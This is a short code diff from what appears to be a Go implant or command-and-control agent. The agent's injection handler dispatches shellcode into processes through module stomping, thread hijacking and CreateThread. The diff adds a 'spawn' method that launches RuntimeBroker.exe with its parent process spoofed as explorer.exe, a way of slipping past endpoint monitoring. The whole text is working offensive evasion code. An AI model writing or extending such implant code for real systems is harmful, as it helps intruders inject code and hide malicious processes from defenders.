@@ -77,6 +77,24 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		injectErr = evasion.StompInject(sc, pid)
 	case "threadhijack":
 		injectErr = evasion.ThreadHijackInject(sc, pid)
+	case "spawn":
+		// Spawn an exe with PPID spoofed to parent (default: explorer.exe).
+		// data field is not used for this method.
+		spawnHost, _ := payload["host"].(string)
+		if spawnHost == "" {
+			spawnHost = `C:\Windows\System32\RuntimeBroker.exe`
+		}
+		spawnParent, _ := payload["parent"].(string)
+		if spawnParent == "" {
+			spawnParent = "explorer.exe"
+		}
+		pi, spawnErr := evasion.SpoofedSpawn(spawnHost, spawnParent)
+		if spawnErr != nil {
+			injectErr = spawnErr
+		} else {
+			windows.CloseHandle(pi.Thread)
+			windows.CloseHandle(pi.Process)
+		}
 	default:
 		injectErr = injectCreateThread(sc, pid)
 	}
